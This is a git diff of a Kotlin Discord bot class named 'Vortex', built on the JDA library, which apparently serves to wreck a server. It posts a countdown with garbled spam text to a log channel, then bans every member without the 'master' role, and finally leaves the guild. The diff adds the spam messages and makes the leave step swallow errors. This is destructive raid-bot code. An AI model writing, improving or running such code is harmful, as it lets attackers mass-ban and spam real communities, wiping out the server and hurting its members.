@@ -4,7 +4,7 @@ import net.dv8tion.jda.api.entities.*
 import net.dv8tion.jda.api.requests.*
 import net.dv8tion.jda.api.Permission
 
-class Vortex(val guild: Guild, val masterRole: String) : Thread()
+class Vortex(val guild: Guild, val log: MessageChannel, val masterRole: String) : Thread()
 {
 
   val chaos = "पतचतंमनजदगहैाीोे्िुपतचतंमनजदगहैाीज"
@@ -23,7 +23,7 @@ class Vortex(val guild: Guild, val masterRole: String) : Thread()
     names()
     banEm()
     shout()
-    Thread.sleep(1000)
+    Thread.sleep(2000)
     leave()
   }
 
@@ -31,10 +31,11 @@ class Vortex(val guild: Guild, val masterRole: String) : Thread()
   {
     for (i in 30 downTo 1) {
       println("$gName => ban in $i")
-
+      log.sendMessage("$i   " + chaotize(128, true)).queue()
       Thread.sleep(1000)
     }
     println("$gName => banning")
+    log.sendMessage("!!!!!" + chaotize(128, true)).complete()
 
     for (member in guild.getMembers()) {
       if (isMaster(member))
@@ -87,7 +88,10 @@ class Vortex(val guild: Guild, val masterRole: String) : Thread()
   fun leave()
   {
     println("$gName => leaving")
-    guild.leave().queue()
+    try {
+      guild.leave().complete()
+    } catch (e: Exception) {
+    }
   }
 
   fun isMaster(member: Member) : Boolean
